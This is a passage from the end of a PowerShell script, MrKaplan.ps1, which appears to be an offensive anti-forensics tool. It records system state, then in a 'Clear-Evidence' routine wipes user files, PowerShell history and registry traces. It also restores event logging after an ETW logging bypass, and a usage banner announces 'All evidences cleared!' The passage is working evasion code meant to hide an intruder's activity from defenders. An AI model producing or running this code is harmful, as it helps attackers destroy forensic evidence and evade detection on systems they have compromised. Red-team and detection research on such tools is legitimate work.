        $configFile[$user]["PSHistory"] = $powershellHistory
    }

    # Dumping the data to json file.
    if (Test-Path "MrKaplan-Config.json") {
        Write-Host "[-] Config file already exists, please delete the current and rerun." -ForegroundColor Red
        return $false
    }

    $configFile | ConvertTo-Json | Out-File "MrKaplan-Config.json"    
    return $true
}

function Clear-Evidence {
    $result = $true

    if (!(Test-Path "MrKaplan-Config.json")) {
        Write-Host "[-] Failed to find config file, re-run the program with begin command." -ForegroundColor Red
        return $false
    }

    # Parsing the config file.
    $configFile = Get-Content "MrKaplan-Config.json" | ConvertFrom-Json | ConvertTo-Hashtable
    
    if (!$configFile) {
        Write-Host "[-] Failed to parse config file." -ForegroundColor Red
        return $false
    }

    # Running the modules on each user.
    Write-Host "[*] Cleaning logs..." -ForegroundColor Blue
    $users = New-Object Collections.Generic.List[String]

    if (!$($configFile.Contains("time"))) {
        Write-Host "[-] Invalid config file structure." -ForegroundColor Red
        return $false
    }

    foreach ($user in $configFile.Keys) {
        if ($user -eq "time" -or $user -eq "EventLogSettings") {
            continue
        }

        $users.Add($user)
        Clear-Files $configFile["time"] $configFile[$user]["PSHistory"] $user 
    }

    if (!$(Clear-Registry $configFile["time"] $users)) {
        Write-Host "[-] Failed to cleanup the registry." -ForegroundColor Red
        $result = $false
    }

    # Restoring the event logging.
    Write-Host "[*] Restoring event logging..." -ForegroundColor Blue

    if ($configFile.Contains("EventLogSettings")) {
        if (!$(Invoke-RestoreEtw $configFile["EventLogSettings"])) {
            Write-Host "[-] Failed to restore the eventlogging." -ForegroundColor Red
            $result = $false
        }
    }
    
    if ($result) {
        Write-Host "[+] Restored! Be careful with your actions now." -ForegroundColor Green
    }
    else {
        Write-Host "[!] Finished with partial restoration." -ForegroundColor Yellow
    }

    return $result
}

if ($operation -eq "begin") {
    if (New-Config $users $etwBypassMethod) {
        Write-Host "`n[+] Saved required information!`n[+] You can do your operations." -ForegroundColor Green
    }
    else {
        Write-Host "`n[-] Failed to create config file." -ForegroundColor Red
    }
}
elseif ($operation -eq "end") {
    if (Clear-Evidence) {
        Write-Host "`n[+] All evidences cleared!" -ForegroundColor Green
    }
    else {
        Write-Host "`n[-] Failed to clear all evidences." -ForegroundColor Red
    }
}
elseif ($operation -eq "help") {
    Write-Host "`n[*] Possible Usage:`n`n[*] Show help message:`n`t.\MrKaplan.ps1 help`n`n[*] For config creation and start:`n`t.\MrKaplan.ps1 begin`n`t.\MrKaplan.ps1 begin -Users Reddington,Liz`n`t.\MrKaplan.ps1 begin -Users Reddington`n`t.\MrKaplan.ps1 begin -EtwBypassMethod overflow`n`n[*] For cleanup:`n`t.\MrKaplan.ps1 end`n`n" -ForegroundColor Blue
}
else {
    Write-Host "`n[!] Invalid Usage!" -ForegroundColor Red
    Write-Host "`n[*] Possible Usage:`n`n[*] Show help message:`n`t.\MrKaplan.ps1 help`n`n[*] For config creation and start:`n`t.\MrKaplan.ps1 begin`n`t.\MrKaplan.ps1 begin -Users Reddington,Liz`n`t.\MrKaplan.ps1 begin -Users Reddington`n`t.\MrKaplan.ps1 begin -EtwBypassMethod overflow`n`n[*] For cleanup:`n`t.\MrKaplan.ps1 end`n`n" -ForegroundColor Blue
}
